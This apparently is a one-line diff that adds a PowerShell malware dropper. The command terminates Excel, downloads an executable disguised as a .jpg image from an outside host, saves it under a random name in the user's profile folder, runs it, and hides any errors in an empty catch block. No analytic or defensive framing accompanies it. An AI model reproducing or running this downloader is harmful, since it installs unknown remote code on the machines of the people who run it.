@@ -1,0 +1,1 @@
+try{kill -processname EXCEL; (New-Object System.Net.WebClient).DownloadFile('https://comfy.moe/zdwwbk.jpg',$env:USERPROFILE+'\CxLkTQAwDUHAxDXcP.exe');(New-Object -com Shell.Application).ShellExecute($env:USERPROFILE+'\CxLkTQAwDUHAxDXcP.exe');}catch {}
